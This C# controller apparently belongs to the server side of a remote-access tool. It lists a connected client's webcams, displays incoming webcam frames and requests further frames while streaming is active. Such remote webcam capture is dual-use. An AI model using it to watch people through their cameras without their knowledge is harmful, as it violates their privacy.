using Serveur.Controllers.Server;
using Serveur.Packets.ClientPackets;
using Serveur.Packets.ServerPackets;
using System.Drawing;
using System.IO;

namespace Serveur.Controllers
{
    public static class FrmRemoteWebcamController
    {
        //Propriétés
        public static string[] webcams;

        public static void getAvailableWebcamsResponse(ClientMosaic client, GetAvailableWebcamsResponse packet)
        {
            if (client.value == null || client.value.frmWbc
                == null)
                return;

            client.value.frmWbc.AddWebcams(packet.webcams);
        }

        public static void getWebcamResponse(ClientMosaic client, GetWebcamResponse packet)
        {
            if (client.value == null
                || client.value.frmWbc == null
                || client.value.frmWbc.IsDisposed
                || client.value.frmWbc.Disposing)
                return;

            if (packet.image == null)
                return;

            using (MemoryStream ms = new MemoryStream(packet.image))
            {
                Bitmap img = new Bitmap(ms);
                client.value.frmWbc.updateImage(img);
            }

            if (client.value != null && client.value.frmWbc != null && client.value.frmWbc.IsStarted)
            {
                new GetWebcam(packet.webcam, packet.quality).Execute(client);
            }
        }
    }
}
